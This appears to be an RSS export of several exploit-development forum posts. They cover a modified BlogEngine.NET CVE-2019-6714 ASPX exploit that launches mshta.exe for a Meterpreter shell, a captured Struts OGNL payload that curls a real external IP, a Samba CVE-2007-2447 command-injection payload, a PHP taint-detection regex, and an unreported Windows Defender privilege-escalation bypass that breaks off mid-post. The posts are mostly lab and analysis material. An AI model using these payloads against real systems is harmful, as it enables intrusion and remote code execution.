            <p>Hey y’all. This will be a quick post discussing my experience in exploit development where I modify the exploit for the CVE-2019-6714 vulnerability; specifically the exploit devevloped by <a href="https://www.exploit-db.com/exploits/46353" rel="noopener nofollow ugc">Cobb (2019)</a>, which exploits a directory traversal vulnerability in the <a href="https://blogengine.io/" rel="noopener nofollow ugc">BlogEngine[.]NET</a> content management system.</p>
<p>This was done for a <a href="https://tryhackme.com/" rel="noopener nofollow ugc">TryHackMe</a> boot2root machine — which I documented in the <em>InfoSec Write-ups</em> journal (see <a href="https://infosecwriteups.com/tryhackme-writeup-hackpark-bd9c075c5262" rel="noopener nofollow ugc">“Aleksey” 2022a</a>; if the paywall is giving you problems, you can view it by opening your browser in private mode <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=12" title=":wink:" class="emoji" alt=":wink:" loading="lazy" width="20" height="20"> ).</p>
<p>I discuss the specifics on how to exploit this vulnerability in my writeup, but TL;DR — it works by uploading a C# script onto a BlogEngine[.]NET powered website that is vulnerable to CVE-2019-6714 and then triggering the exploit to execute via a GET request to said C# script.</p>
<p>I posted my modified version of Cobb’s exploit onto <a href="https://github.com/Alekseyyy/InfoSec/blob/master/exploits/CVE-2019-6714.cs" rel="noopener nofollow ugc">one of my GitHub repos</a>. The source code, minus the comments, of my modified exploit is:</p>
<pre><code class="lang-auto">&lt;%@ Control Language="C#" AutoEventWireup="true" EnableViewState="false" Inherits="BlogEngine.Core.Web.Controls.PostViewBase" %&gt;
&lt;%@ Import Namespace="BlogEngine.Core" %&gt;

&lt;script runat="server"&gt;

    protected override void OnLoad(EventArgs e) {
        base.OnLoad(e);
        System.Diagnostics.Process payload = new System.Diagnostics.Process();
        payload.StartInfo.FileName = "mshta.exe";
        payload.StartInfo.Arguments = "";
        payload.StartInfo.UseShellExecute = true;
        payload.StartInfo.CreateNoWindow = true;
        payload.Start();
    }
    
&lt;/script&gt;
&lt;asp:PlaceHolder ID="phContent" runat="server" EnableViewState="false"&gt;&lt;/asp:PlaceHolder&gt;
</code></pre>
<p>Cobb’s original exploit uses C# network sockets libraries to make a reverse shell onto the attacker’s machine. The TryHackMe room had me “upgrade” my shell to the Meterpreter shell, but I decided to bypass that by modify Cobb’s exploit to execute code via <code>mshta.exe</code>, then generate a Meterpreter payload that executes via an HTA server, then upload this script to the BlogEngine[.]NET website, trigger it and finally get a reverse Meterpreter shell. The line <code>payload.StartInfo.Arguments = "";</code> should contain the URL to the malicious HTA file to execute a payload (note that the HTA server could be any payload, not necessarily a reverse Meterpreter shell).</p>
<h2>
<a name="conclusion-1" class="anchor" href="https://0x00sec.org#conclusion-1"></a>Conclusion</h2>
<p>This isn’t really a remarkable discovery — just “building off” the discovery of someone smarter than myself and trying to make my life easier. Plus, I’m trying to be a hacker — and what made me want to do go on with modifying Cobb’s exploit is that I didn’t want to follow the room’s instructions exactly as laid out. I gotta deviate from it in some way <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=12" title=":wink:" class="emoji" alt=":wink:" loading="lazy" width="20" height="20"></p>
<p>Of course, I welcome any feedback or criticisms regarding my work <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=12" title=":smiley:" class="emoji" alt=":smiley:" loading="lazy" width="20" height="20"></p>
<h2>
<a name="references-2" class="anchor" href="https://0x00sec.org#references-2"></a>References</h2>
<ul>
<li>
<p>“Aleksey” (2022a). <em>TryHackMe writeup: HackPark</em>. InfoSec Write-ups. Retrieved on Dec. 31, 2022 from: <a href="https://infosecwriteups.com/tryhackme-writeup-hackpark-bd9c075c5262" rel="noopener nofollow ugc">https://infosecwriteups.com/tryhackme-writeup-hackpark-bd9c075c5262</a></p>
</li>
<li>
<p>“Aleksey” (2022b). <em>Infosec/CVE-2019-6714.cs</em> GitHub Repository. Retrieved on Dec. 31, 2022 from: <a href="https://github.com/Alekseyyy/InfoSec/blob/master/exploits/CVE-2019-6714.cs" rel="noopener nofollow ugc">https://github.com/Alekseyyy/InfoSec/blob/master/exploits/CVE-2019-6714.cs</a></p>
</li>
<li>
<p><a href="http://BlogEngine.NET" rel="noopener nofollow ugc">BlogEngine.NET</a> (n.d.). <em><a href="http://BlogEngine.NET" rel="noopener nofollow ugc">BlogEngine.NET</a> | Free blogging platform</em>. Retrieved on May 7, 2022 from: <a href="https://blogengine.io/" rel="noopener nofollow ugc">https://blogengine.io/</a></p>
</li>
<li>
<p>Cobb, D. (2019). <em><a href="http://BlogEngine.NET" rel="noopener nofollow ugc">BlogEngine.NET</a> &lt;= 3.3.6 Directory Traversal RCE</em>. Exploit Database. Retrieved on Dec. 31, 2022 from: <a href="https://www.exploit-db.com/exploits/46353" class="inline-onebox" rel="noopener nofollow ugc">BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution - ASPX webapps Exploit</a></p>
</li>
<li>
<p>TryHackMe (n.d.). Retrieved on Dec. 31, 2022 from: <a href="https://tryhackme.com/" rel="noopener nofollow ugc">https://tryhackme.com/</a></p>
</li>
<li>
<p>TryHackMe (n.d.-b). <em>HackPark</em>. TryHackMe. Retrieved from Dec. 31, 2022 from: <a href="https://tryhackme.com/room/hackpark" rel="noopener nofollow ugc">https://tryhackme.com/room/hackpark</a></p>
</li>
</ul>
            <p><small>2 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/modified-cve-2019-6714-poc-to-execute-payload-via-mshta-exe/32728">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/modified-cve-2019-6714-poc-to-execute-payload-via-mshta-exe/32728</link>
          <pubDate>Sat, 31 Dec 2022 22:46:44 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-32728</guid>
          <source url="https://0x00sec.org/t/modified-cve-2019-6714-poc-to-execute-payload-via-mshta-exe/32728.rss">Modified CVE-2019-6714 PoC to execute payload via mshta.exe</source>
        </item>
        <item>
          <title>What Type of file extension would be more common in linux based malware?</title>
          <dc:creator><![CDATA[Satoshin]]></dc:creator>
          <category>Exploit Development</category>
          <description><![CDATA[
            <p>Like on windows there are exe (compiled from python, C or C++ assembly), VBS, bat extensions to name a few that can be dangerous.</p>
<p>But if Linux malware was to be made that could spread or do damage what would be its source extension? and this very question is why Linux has little malware or least a moderate malware scale. You see malware can be any file extension such as C,C++,Go,python,VBS you name it. but in a actual situation. one that seems discreet just one user happens to run it. now this can come from anything, let me set up a Situation:</p>
<p>User is on a forum and another Linux user made software that can assist in programs ram runtime and memory usage. User wants to try it out so they will download the zip file like another person would do, unzip the file then see the readme license and a few files, and the malware will be in filename <em>Ramctrl.randomextension</em> and they run it.</p>
<p>Okay this sounds funny and very silly and the probability of this happening is very low. but what would that magic file extension be? and how effective would you think it would be?</p>
            <p><small>4 posts - 4 participants</small></p>
            <p><a href="https://0x00sec.org/t/what-type-of-file-extension-would-be-more-common-in-linux-based-malware/26068">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/what-type-of-file-extension-would-be-more-common-in-linux-based-malware/26068</link>
          <pubDate>Sun, 23 May 2021 02:22:29 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-26068</guid>
          <source url="https://0x00sec.org/t/what-type-of-file-extension-would-be-more-common-in-linux-based-malware/26068.rss">What Type of file extension would be more common in linux based malware?</source>
        </item>
        <item>
          <title>Relation between RE &amp; exploit development</title>
          <dc:creator><![CDATA[alexa]]></dc:creator>
          <category>Exploit Development</category>
          <description><![CDATA[
            <p>hey everyone, hope your good<br>
i just wanted to ask about this topic. although i know that reverse engineering is a must before going into exploitation and exploit writing …<br>
but in case we already know the vulnerability, and we know what is it, from going to places like :<br>
<a href="https://www.cvedetails.com/" class="onebox" target="_blank" rel="noopener nofollow ugc">https://www.cvedetails.com/</a><br>
<a href="https://www.exploit-db.com/" class="onebox" target="_blank" rel="noopener nofollow ugc">https://www.exploit-db.com/</a></p><aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://0x00sec.s3.amazonaws.com/original/3X/0/a/0ad39240157227cd6349ad14502729ac756d6a7e.png" class="site-icon" width="32" height="32">
      <a href="https://www.tenable.com/cve/search" target="_blank" rel="noopener nofollow ugc">tenable.com</a>
  </header>
  <article class="onebox-body">
    <img src="" class="thumbnail" width="" height="">

<h3><a href="https://www.tenable.com/cve/search" target="_blank" rel="noopener nofollow ugc">CVE Search</a></h3>

<p>Search over 100,000 CVEs covering local and remote flaws.</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>
<p><a href="https://cve.mitre.org/" class="onebox" target="_blank" rel="noopener nofollow ugc">https://cve.mitre.org/</a><br>
<a href="https://nvd.nist.gov/" class="onebox" target="_blank" rel="noopener nofollow ugc">https://nvd.nist.gov/</a><br>
and much more…<br>
can we just pass reverse engineering in this situation ? or even with reference to these websites we still need to reverse engineer something here and there and figure it out ?<br>
it is not discovering a new bug but just exploiting a known one. but if we must learn reverse engineering then what is the most required practice for it (to build exploits for vulnerabilities that are known), since right now i am cracking some challenges on crackmes.one and i don’t think this helps a lot.</p>
<p>thank you guys, and i hope you got the point.</p>
            <p><small>11 posts - 4 participants</small></p>
            <p><a href="https://0x00sec.org/t/relation-between-re-exploit-development/24811">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/relation-between-re-exploit-development/24811</link>
          <pubDate>Wed, 03 Feb 2021 13:22:43 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-24811</guid>
          <source url="https://0x00sec.org/t/relation-between-re-exploit-development/24811.rss">Relation between RE &amp; exploit development</source>
        </item>
        <item>
          <title>The S2-061 Struts remote code execution vulnerability (CVE-2020-17530) in the WILD</title>
          <dc:creator><![CDATA[Ishma_Frcher5]]></dc:creator>
          <category>Exploit Development</category>
          <description><![CDATA[
            <p>S2-061 Struts remote code execution vulnerability (CVE-2020-17530) on December 08, 2020 by apache and its marked “difficult to weaponize” by most sites i’ve checked after finding this request. Today looking at my server logs I found a ‘GET’ request with these:(I wont remove anything it might help a reseacher make sense of it)</p>
<blockquote>
<p><code>"GET /?id=%25%7B%28%27Powered_by_Unicode_Potats0%2Cenjoy_it%27%29.%28%23UnicodeSec+%3D+%23application%5B%27org.apache.tomcat.InstanceManager%27%5D%29.%28%23potats0%3D%23UnicodeSec.newInstance%28%27org.apache.commons.collections.BeanMap%27%29%29.%28%23stackvalue%3D%23attr%5B%27struts.valueStack%27%5D%29.%28%23potats0.setBean%28%23stackvalue%29%29.%28%23context%3D%23potats0.get%28%27context%27%29%29.%28%23potats0.setBean%28%23context%29%29.%28%23sm%3D%23potats0.get%28%27memberAccess%27%29%29.%28%23emptySet%3D%23UnicodeSec.newInstance%28%27java.util.HashSet%27%29%29.%28%23potats0.setBean%28%23sm%29%29.%28%23potats0.put%28%27excludedClasses%27%2C%23emptySet%29%29.%28%23potats0.put%28%27excludedPackageNames%27%2C%23emptySet%29%29.%28%23exec%3D%23UnicodeSec.newInstance%28%27freemarker.template.utility.Execute%27%29%29.%28%23cmd%3D%7B%27curl+93.189.44.137%2Fssa%27%7D%29.%28%23res%3D%23exec.exec%28%23cmd%29%29%7D HTTP/1.0"</code></p>
</blockquote>
<p><em>Decoding the URL</em></p>
<blockquote>
<p><code>{('Powered_by_Unicode_Potats0,enjoy_it').(#UnicodeSec = #application['org.apache.tomcat.InstanceManager']).(#potats0=#UnicodeSec.newInstance('org.apache.commons.collections.BeanMap')).(#stackvalue=#attr['struts.valueStack']).(#potats0.setBean(#stackvalue)).(#context=#potats0.get('context')).(#potats0.setBean(#context)).(#sm=#potats0.get('memberAccess')).(#emptySet=#UnicodeSec.newInstance('java.util.HashSet')).(#potats0.setBean(#sm)).(#potats0.put('excludedClasses',#emptySet)).(#potats0.put('excludedPackageNames',#emptySet)).(#exec=#UnicodeSec.newInstance('freemarker.template.utility.Execute')).(#cmd={'curl 93.189.44.137/ssa'}).(#res=#exec.exec(#cmd))}</code></p>
</blockquote>
<p>Decoding it and a little google search I found this chinese site that had described the POC with example of the real exploitation “<a href="https://www.cnblogs.com/potatsoSec/p/14111163.html" rel="noopener nofollow ugc">https://www.cnblogs.com/potatsoSec/p/14111163.html</a>”. With the site having the name “potatso” and the exploit having “potats0” is it a coincidence or is it a script-kiddie who just copied the code and tried just hitting anything online?? The IP 93[.]189[.]44[.]137 which curl calls is from Russia though. Researching on the exploit its marked “difficult to weaponize”. I still dont know if this is necessary  or it might help but Id say just patch  even if its marked with low risk.</p>
            <p><small>2 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/the-s2-061-struts-remote-code-execution-vulnerability-cve-2020-17530-in-the-wild/24324">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/the-s2-061-struts-remote-code-execution-vulnerability-cve-2020-17530-in-the-wild/24324</link>
          <pubDate>Tue, 22 Dec 2020 21:10:22 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-24324</guid>
          <source url="https://0x00sec.org/t/the-s2-061-struts-remote-code-execution-vulnerability-cve-2020-17530-in-the-wild/24324.rss">The S2-061 Struts remote code execution vulnerability (CVE-2020-17530) in the WILD</source>
        </item>
        <item>
          <title>Regex for Easy 0days</title>
          <dc:creator><![CDATA[hunter]]></dc:creator>
          <category>Exploit Development</category>
          <description><![CDATA[
            <p>Here is a regex I wrote to detect if a PHP code is calling dangerous functions with tainted variables.</p>
<blockquote>
<p>/(\$[a-zA-Z0-9]+) ?=[^;]*\$_(GET|POST|REQUEST)[^;]*;.*(shell_exec|system|exec|passthru|eval)\([^\)]*\1[^\)]*\)/gms</p>
</blockquote>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.dualstack.us-east-1.amazonaws.com/original/2X/f/f7cc312555538252f269c68e7ae09a3bd38a98d6.jpeg" data-download-href="https://0x00sec.org/uploads/default/f7cc312555538252f269c68e7ae09a3bd38a98d6" title="IMG_20200906_101420_756"><img src="https://0x00sec.org/uploads/default/optimized/2X/f/f7cc312555538252f269c68e7ae09a3bd38a98d6_2_690x326.jpeg" alt="IMG_20200906_101420_756" data-base62-sha1="zm7pHiYdRPXXeHvNzAaLGSPEyWi" width="690" height="326" srcset="https://0x00sec.org/uploads/default/optimized/2X/f/f7cc312555538252f269c68e7ae09a3bd38a98d6_2_690x326.jpeg, https://0x00sec.org/uploads/default/optimized/2X/f/f7cc312555538252f269c68e7ae09a3bd38a98d6_2_1035x489.jpeg 1.5x, //0x00sec.s3.dualstack.us-east-1.amazonaws.com/original/2X/f/f7cc312555538252f269c68e7ae09a3bd38a98d6.jpeg 2x" data-small-upload="https://0x00sec.org/uploads/default/optimized/2X/f/f7cc312555538252f269c68e7ae09a3bd38a98d6_2_10x10.png"></a></div><p></p>
            <p><small>5 posts - 3 participants</small></p>
            <p><a href="https://0x00sec.org/t/regex-for-easy-0days/23016">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/regex-for-easy-0days/23016</link>
          <pubDate>Sun, 06 Sep 2020 07:19:28 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-23016</guid>
          <source url="https://0x00sec.org/t/regex-for-easy-0days/23016.rss">Regex for Easy 0days</source>
        </item>
        <item>
          <title>CVExplained - CVE-2007-2447</title>
          <dc:creator><![CDATA[nikkiofthenet]]></dc:creator>
          <category>Exploit Development</category>
          <description><![CDATA[
            <p>Summary and TLDR at the bottom.</p>
<p>CVE-2007–2447 allows remote attackers to run commands via the username parameter in Samba 3.0.0–3.0.25rc3. Below is the POC seen in most scripts.</p>
<blockquote>
<p>/=`nohup {payload}`</p>
</blockquote>
<p>You can send this text as the username via the “logon” command in smbclient and your payload is executed. (Note: The “=” is not actually required to run this exploit. I am not sure why it is in most POCs.) Interestingly, if you send the username via impacket or another script, the “/” isn’t required! I’ll explain later in this post why that is. Below is a script modified by <a class="mention" href="https://0x00sec.org/u/jarvis">@Jarvis</a> that shows there is no need for the “/”.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/7/742138862ae421c44e9f06e6532c7af0f0bae7c0.png" alt="exploitimpacket" data-base62-sha1="gzkyPz7KSjrTbW0Fj1R8l3aCcWQ" width="477" height="228"><br>
Now that we know how to exploit this CVE, let’s dig into how it works!</p>
<p>After a bit of investigation I found two files that are important to look at:</p>
<ul>
<li>source/lib/smbrun.c</li>
<li>source/smbd/map_username.c</li>
</ul>
<p>Looking into map_username.c we find this little blob of code.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/0/0c5991e779f11e0fefbaf1f8965b99cd57a5eea2.png" data-download-href="/uploads/short-url/1LfDcLszSCvu8ODZAG5NOXPfvfI.png?dl=1" title="mapusername" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/0/0c5991e779f11e0fefbaf1f8965b99cd57a5eea2_2_517x235.png" alt="mapusername" data-base62-sha1="1LfDcLszSCvu8ODZAG5NOXPfvfI" width="517" height="235" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/0/0c5991e779f11e0fefbaf1f8965b99cd57a5eea2_2_517x235.png, https://0x00sec.s3.amazonaws.com/optimized/2X/0/0c5991e779f11e0fefbaf1f8965b99cd57a5eea2_2_775x352.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/2X/0/0c5991e779f11e0fefbaf1f8965b99cd57a5eea2_2_1034x470.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/0/0c5991e779f11e0fefbaf1f8965b99cd57a5eea2_2_10x10.png"></a></div><br>
From this we can see that the username we send is combined with the script that is set in the smb.conf file to give us a string such as<p></p>
<blockquote>
<p>/etc/samba/script/usermap.sh “Jimmy”</p>
</blockquote>
<p>That string is then sent to the smbrun function. Taking a quick peek at the smbrun function reveals that it has been turned into a wrapper for a new smbrun_internal function with a hard coded parameter.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/d/db538e6a249785957a743647cc578a340a3fde57.png" data-download-href="/uploads/short-url/vifAfakHK6imyBUEDmvUcurArFJ.png?dl=1" title="smbrun" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/d/db538e6a249785957a743647cc578a340a3fde57_2_517x138.png" alt="smbrun" data-base62-sha1="vifAfakHK6imyBUEDmvUcurArFJ" width="517" height="138" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/d/db538e6a249785957a743647cc578a340a3fde57_2_517x138.png, https://0x00sec.s3.amazonaws.com/optimized/2X/d/db538e6a249785957a743647cc578a340a3fde57_2_775x207.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/2X/d/db538e6a249785957a743647cc578a340a3fde57_2_1034x276.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/d/db538e6a249785957a743647cc578a340a3fde57_2_10x10.png"></a></div><p></p>
<p>Taking a peek at the smbrun_internal function we find that the hardcoded parameter in smbrun is the sanitize parameter! We also see that previously, the smbrun function sent unsanitized data to the execl function.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/2/27a6c3eaf1e33975e433ee35491f374c6e5a49ad.png" data-download-href="/uploads/short-url/5ELUGOhNAjTPJu25m5LAmgrhlMh.png?dl=1" title="smbruninternal" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/2/27a6c3eaf1e33975e433ee35491f374c6e5a49ad_2_690x473.png" alt="smbruninternal" data-base62-sha1="5ELUGOhNAjTPJu25m5LAmgrhlMh" width="690" height="473" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/2/27a6c3eaf1e33975e433ee35491f374c6e5a49ad_2_690x473.png, https://0x00sec.s3.amazonaws.com/optimized/2X/2/27a6c3eaf1e33975e433ee35491f374c6e5a49ad_2_1035x709.png 1.5x, https://0x00sec.s3.amazonaws.com/original/2X/2/27a6c3eaf1e33975e433ee35491f374c6e5a49ad.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/2/27a6c3eaf1e33975e433ee35491f374c6e5a49ad_2_10x10.png"></a></div><p></p>
<p>This is the root cause of our vulnerability. A normal logon request would look like this to execl:</p>
<blockquote>
<p>/bin/sh sh -c /etc/samba/scripts/mapscript.sh “Jimmy”</p>
</blockquote>
<p>However if we were to inject the username with our exploit this is what would be passed to execl:</p>
<blockquote>
<p>/bin/sh sh -c /etc/samba/scripts/mapscript.sh “`nohup {payload}`”</p>
</blockquote>
<p>Cool! So a relatively simple exploit. We abuse backticks in unsanitized text that is passed to sh to gain command execution. But what happened to the forward slash? Long story short, the “/” acts as a delimiter for the domain field in smbclient. Below is a side by side comparison of an attempt to run this exploit with and without the “/” (Left without the “/”, right with the “/”)</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/f/ff7abcfc8dec7688f404c1ee21588995384d6e02.png" data-download-href="/uploads/short-url/As4IFf4QVLs0yXwSP0Ma48YLKkG.png?dl=1" title="domainfieldskip" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/f/ff7abcfc8dec7688f404c1ee21588995384d6e02_2_690x330.png" alt="domainfieldskip" data-base62-sha1="As4IFf4QVLs0yXwSP0Ma48YLKkG" width="690" height="330" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/f/ff7abcfc8dec7688f404c1ee21588995384d6e02_2_690x330.png, https://0x00sec.s3.amazonaws.com/optimized/2X/f/ff7abcfc8dec7688f404c1ee21588995384d6e02_2_1035x495.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/2X/f/ff7abcfc8dec7688f404c1ee21588995384d6e02_2_1380x660.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/f/ff7abcfc8dec7688f404c1ee21588995384d6e02_2_10x10.png"></a></div><p></p>
<p><strong>Summary/TLDR</strong><br>
CVE-2007–2447 is a remote command injection vulnerability in the username parameter of Samba 3.0.0–3.0.25rc3 caused by a lack of input sanitization. The reason for the “/” character in the exploit is to separate the domain field and the username field in smbclient. I do not know the reason for the “=” character in most POCs.</p>
<p><strong>Credits</strong><br>
<a class="mention" href="https://0x00sec.org/u/jarvis">@Jarvis</a> - Modified impacket script to exploit CVE-2007-2447<br>
Amriunix - Helped me understand why the “/” was needed and also let me know that the “=” wasn’t required.</p>
<p>This is my first “writeup” of sorts, I appreciate any and all feedback! Hopefully you learned something <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
            <p><small>3 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/cvexplained-cve-2007-2447/22748">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/cvexplained-cve-2007-2447/22748</link>
          <pubDate>Mon, 17 Aug 2020 23:24:32 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-22748</guid>
          <source url="https://0x00sec.org/t/cvexplained-cve-2007-2447/22748.rss">CVExplained - CVE-2007-2447</source>
        </item>
        <item>
          <title>Windows Defender AV Zero Day Vulnerability</title>
          <dc:creator><![CDATA[bruh11]]></dc:creator>
          <category>Exploit Development</category>
          <description><![CDATA[
            <p><strong>Windows Defender Elevation Of Privileges Vulnerability</strong></p>
<p>Well first of all why?</p>
<p>Cause Microsoft stopped their shitty bug bounty program for windows eop bugs so I don’t have any interest to report them to the vendor</p>
<p>In the last decade I was looking for windows defender bugs but I was just spending time I thought MS just made the perfect av, until I saw <a href="https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2020-1170" rel="noopener nofollow ugc">this</a></p>
<p>However, this is the description From Microsoft:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/1/14009a93a9f8fe62bef735a5c3756238e617d895.png" alt="image" data-base62-sha1="2QWQgN7cg8V2iI7N4YtdRIBB2h7" width="601" height="190"><br>
The guy who’s acknowledged is usually disclosing his bugs so I was waiting for him this time to see if I can bypass the security patch.<br>
and then he posted his <a href="https://itm4n.github.io/cve-2020-1170-windows-defender-eop/" rel="noopener nofollow ugc">article</a>  so when I read his write up it seemed bypassable to me (if you’re reading this it4mn THANK YOU !).<br>
Let’s get into the bug, on a default configuration there’s a file in <code>c:\windows\temp\mpcmdrun.log</code> this file is used for event logging that happen in <code>mpcmdrun.log</code> process, which runs in the context of the local system (highest privileges that exist on windows), as <code>it4mn</code> said when the log file should reach   <strong>16,777,216 bytes (16MB)</strong> in order to trigger the bug let’s thing on process monitor, you can download it <a href="https://download.sysinternals.com/files/ProcessMonitor.zip" rel="noopener nofollow ugc">here</a></p>
<p>Okay Let’s try to reproduce the bug<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/0/0c735d6ea757736c8f863b8d3d0372e7247a4a90.png" alt="image" data-base62-sha1="1M8TFJlAM9vuhBRffucZBxGWojC" width="602" height="314"><br>
Let’s see what happens on procmon<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/c/c7bbdbe20518d7d437ea5a7abde92ac40444bf82.png" alt="image" data-base62-sha1="suVv9Ano6TJHNxeYIQNW8mUbwvo" width="601" height="260"><br>
As you can see the patch seems to be working as it supposed to be, you can see the <code>MpCmdRun.exe</code> handling the junction with <code>GENERIC_ALL</code> access and then he execute the control code <code>FSCTL_GET_REPARSE_POINT</code> and <code>FSCTL_DELETE_REPARSE_POINT</code> both result in success, the get reparse point control is simply check if the directory is a reparse point but the control code delete reparse point will attempt to convert the junction <code>mpcmdrun.log.bak</code> to a directory then it proceeds to delete it. Seems to be patched correctly! but there’s still something wrong with the patch, what if we created a junction inside the mpcmdrun.log.bak ? ex: mpcmdrun.log.bak\test, let’s check it out</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/b/b5d00aca4f3f283035debc853cb6a684395bf589.jpeg" alt="image" data-base62-sha1="pWo9k8KhqT2kp6GQMevroBqAwUp" width="601" height="362"><br>
It worked we now have an arbitrary file deletion issue in windows defender.</p>
<p>Okay let’s do some more damage, let’s go for a system shell</p>
<p><strong>NOTE: this method will work on windows 10 only</strong></p>
<p>Let’s see what privileges are given to <code>MpCmdRun.exe</code> we can inspect them in process explorer<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/1/1b5f45c4725366527302d6365fb0587b37668603.jpeg" alt="image" data-base62-sha1="3U90KIywm4wfScM9JRSBacVdngv" width="601" height="338"><br>
It seems look like <code>mpcmdrun</code> is child process from <code>MsMpEng.exe</code> which is actually the AV<br>
Let’s check the AV:<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/e/e26634e01e1b51aafb22d357474cbc2a49e90565.png" alt="image" data-base62-sha1="wiOSRiEx5t7UvVT7cE2VrCrjLFz" width="601" height="342"><br>
It ran in the context of <code>NT AUTHORITY\SYSTEM</code> but what about other privileges in the token ?<br>
</p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/c/c370a2594619aa24f275d2eec7ca3ac7b8de0c8a.png" data-download-href="/uploads/short-url/rSWqjb2Br9JqLTb57I7QFeMW5Ae.png?dl=1" title="image" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/c/c370a2594619aa24f275d2eec7ca3ac7b8de0c8a.png" alt="image" data-base62-sha1="rSWqjb2Br9JqLTb57I7QFeMW5Ae" width="346" height="500" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/c/c370a2594619aa24f275d2eec7ca3ac7b8de0c8a_2_10x10.png"></a></div><br>
The <code>SeRestorePrivilege</code> seems to be enabled this happen because of the inherit token of <code>MsMpEng.exe</code><br>
This seems to be destructive, this privilege will allow its owner to delete any file even if it isn’t allowed to do so the ACL.<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/9/94e01fef4acfa53e834407c894dde3fc0bc7277d.png" alt="image" data-base62-sha1="lf0QK0qkhOPHanBlUUPOgxQztcp" width="601" height="219"><br>
In this case we will have the ability to hijack a service which we will target the Windows Media Player Network Service which is by default located on <code>C:\Program Files\Windows Media Player\wmpnetwk.exe</code>, this file is protected by <code>NT SERVICE\TRUSTEDINSTALLER</code> this mitigation protected such folders from being deleted from a privileged process (such as <code>administrators</code> or <code>SYSTEM</code>) and then here’s the roll of having the <code>SeRestorePrivilege</code> Enabled this will allow us to bypass this mitigation so we can clean the entire directory <code>C:\Program Files\Windows Media Player</code>, However the Windows Media Player Network Service is on demand service start in windows 10 and it’s ACL allow INTERACTIVE group to start it we can inspect such services detail in process hacker<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/6/6e6801236bca76a66922fd6e486f99012a7eb45f.png" alt="image" data-base62-sha1="fKHlIm6DgJb37oM6hPHHXYNqOaH" width="448" height="471"><br>
